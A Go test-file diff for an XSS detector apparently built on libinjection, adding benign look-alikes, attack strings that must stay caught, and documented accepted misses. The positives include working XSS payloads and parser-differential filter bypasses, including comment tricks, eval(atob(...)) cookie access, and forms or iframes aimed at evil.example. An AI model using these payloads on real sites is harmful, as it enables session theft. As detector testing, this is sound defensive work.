@@ -574,6 +574,8 @@ var xssInertMarkupNegatives = []string{
 	"javascript: tip=1; practise (daily)",
 	"JavaScript: price=10; discount (-2 dollars)",
 	"JavaScript: level=1; then (see notes)",
+	"JavaScript: a=1; note (two days, maybe)",
+	"javascript: a=1; plan ( later )",
 }
 
 // xssInertMarkupPositives must stay caught: real markup next to (or inside)
@@ -652,26 +654,125 @@ var xssInertMarkupPositives = []string{
 	"javascript: a=1; eval (atob('YWxlcnQoMSk='))",
 	"javascript: yes=no; maybe(later)",
 	"javascript: yes=no;maybe (later)",
+	// A real tag after an RCDATA or RAWTEXT element whose text holds "<!--":
+	// browsers read that "<!--" as text, "</title>" closes the element and
+	// the tag runs, while libinjection reads a comment up to "-->".
+	"<title><!--</title><img src=x onerror=alert(1)>`--></title>",
+	"<textarea><!--</textarea><img src=x onerror=alert(1)>`-->",
+	"<xmp><!--</xmp><img src=x onerror=alert(1)>`-->",
+	"<noembed><!--</noembed><img src=x onerror=alert(1)>`-->",
+	"<noframes><!--</noframes><img src=x onerror=alert(1)>`-->",
+	"<title><!--</title><svg onload=alert(1)>`-->",
+	"<title><!--</title><svg/onload=alert(1)>`",
+	"<title><!--</title><a href=javascript:alert(1)>x</a>`-->",
+	"<title><!--</title><iframe src=javascript:alert(1)>`-->",
+	"<title><!--</title><body onload=alert(1)>`-->",
+	"<title><!--</title><details open ontoggle=alert(1)>`-->",
+	"<title><!--</title><input autofocus onfocus=alert(1)>`-->",
+	"<TITLE><!--</TITLE><IMG SRC=x ONERROR=alert(1)>`-->",
+	"<title><!--</title><img src=x onerror=alert(1)><!--`-->",
+	"<textarea><!--</textarea><img src=x onerror=alert(1)><!-- `y` -->",
+	"<meta><title><!--</title><img src=x onerror=alert(1)>`-->",
+	"<title><!--</title><iframe src=//evil.example>`-->",
+	"<title><!--</title><link rel=import href=//evil.example/x>`-->",
+	"<title/><!--</title><img src=x onerror=alert(1)>`-->",
+	"<title x=1><!--</title><img src=x onerror=alert(1)>`-->",
+	"<math><mtext><title><!--</title><img src=x onerror=alert(1)>`-->",
+	"<plaintext><!--`-->",
+	// Markup a comment hides from libinjection but not from a browser: an
+	// early "<!-->" close, a form, a nested opener, entity-written '='.
+	"<!--><form action=//evil.example/><button>x</button>`-->",
+	"<!--x`--><form><button formaction=//evil.example>x",
+	"<!--`--><button form=f formaction=//evil.example>x",
+	"<!-- <!-- `x` --> <img src=x onerror=alert(1)> -->",
+	"<!--x`--><img src=x onerror&#x3d;alert(1)>",
+	"<svg><![CDATA[<!--]]><img src=x onerror=alert(1)>`-->",
+	// A bare placeholder next to handler or URL text.
+	"<base> onerror=alert(1)",
+	"<link> onload=alert(1)",
+	"<object> data=javascript:alert(1)",
+	"<object>javascript:alert(1)",
+	"\" data=javascript:alert(1) <object>",
+	"<link>\" onfocus=alert(1) autofocus x=\"",
+	"<!DOCTYPE x javascript:alert(1)",
+	// javascript: code after "; " with a blank before '(': anything but a
+	// single plain word or blank-separated words is code.
+	"javascript: a=1; eval (atob ('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))",
+	"javascript: a=1; eval (unescape ('%61lert(1)'))",
+	"javascript: a=1; alert (eval (name))",
+	"javascript: a=1; alert (String.fromCharCode (49))",
+	"javascript: a=1; alert (/x/)",
+	"javascript: a=1; alert (/*c*/1)",
+	"javascript: a=1; alert (this)",
+	"javascript: a=1; alert (new Image)",
+	"javascript: a=1; alert (void 0)",
+	"javascript: a=1; alert (typeof x)",
+	"javascript: a=1; alert (await 1)",
+	"javascript: a=1; alert (delete x)",
+	"javascript: a=1; alert (x in y)",
+	"javascript: a=1; alert (x instanceof y)",
+	"javascript: a=1; alert (0x1)",
+	"javascript: a=1; alert (1e3)",
+	"javascript: a=1; alert (1n)",
+	"javascript: a=1; alert (x || 1)",
+	"javascript: a=1; alert (x?.y)",
+	"javascript: a=1; alert (a=1)",
+	"javascript: a=1; alert (- x)",
+	"javascript: a=1; alert (x - y)",
+	"javascript: a=1; alert (!x)",
+	"javascript: a=1; alert (document .cookie)",
+	"javascript: a=1; alert (top .x)",
+	"javascript: a=1; alert (\\u0031)",
+	"javascript: a=1; alert (_)",
+	"javascript: a=1; alert ($)",
+	"javascript: a=1; alert (x, 1)",
+	"javascript: a=1; alert (a, b)",
+	"javascript: a=1; alert (cookie)",
+	"javascript: a=1; alert (origin)",
+	"javascript: a=1; alert (localStorage)",
+	"javascript: a=1; alert (true)",
+	"javascript: a=1; location (x)",
+	"javascript: a=1;\talert (atob ('x'))",
+	"javascript: a=1; alert\t(atob ('x'))",
+	"javascript: a=1;\nalert (x)",
+	"javascript: a=1; alert\t(x)",
+	"javascript: a=1; alert\n(x)",
 }
 
 // xssInertMarkupAcceptedMisses are attack-shaped values the inert-markup
-// rules deliberately let through (the documented recall cost). If one of
-// them starts to hit, update the threat model.
+// rules deliberately let through (the documented recall cost), one group
+// per item of the accepted-miss list in isInertMarkup's comment,
+// docs/threat-model.md and testdata/corpus/README.md. If one of them starts
+// to hit, update all three.
 var xssInertMarkupAcceptedMisses = []string{
-	// A blank-separated call after "; " whose argument is a single plain
-	// word: it has the shape of "maybe (later)". As a script it throws a
-	// ReferenceError unless x is defined by the page.
+	// 1. A call after "javascript: k=v; " with plain spaces before the name
+	// and the '(' whose argument is one letter-only word that is no JS
+	// keyword or browser global, or words separated by blanks alone: the
+	// shape of "maybe (later)". As a script it throws a ReferenceError
+	// (or a SyntaxError) unless the page defines the name.
 	"javascript: a=1; alert (x)",
 	"javascript: a=1; fetch (url)",
-	"javascript: a=1; alert (a, b)",
-	// A bare "<object>", "<link>" or "<base>" with no attribute and no
-	// attribute on any other tag in the value: nothing loads or runs.
+	"javascript: a=1; alert (x y)",
+	// 2. A bare "<object>", "<link>", "<base>", "<meta>" or "<embed>" with
+	// no attribute on any tag in the value: nothing loads or runs.
 	"<object>",
 	"<link>",
 	"<base>",
+	"<meta>",
+	"<embed>",
 	"<object><embed>",
-	// A "<!DOCTYPE" that never closes: a mention, and a doctype runs nothing.
+	// 3. A "<!DOCTYPE" with no '>' and no '[' after it: a mention, and a
+	// doctype runs nothing.
 	"<!DOCTYPE",
+	"<!DOCTYPE html",
+	// 4. A backtick inside an HTML comment or a bogus comment with nothing
+	// else flagged: here a link, which libinjection does not flag without
+	// the comment either.
+	"<!-- `x` --><math href=//evil.example>x</math>",
+	// 5. A JavaScript-string breakout followed by an HTML comment holding a
+	// backtick: libinjection has no JavaScript context, and the same
+	// breakout without the comment was never flagged.
+	"';alert(1)//<!--`-->",
 }
 
 func TestXSSInertMarkup(t *testing.T) {
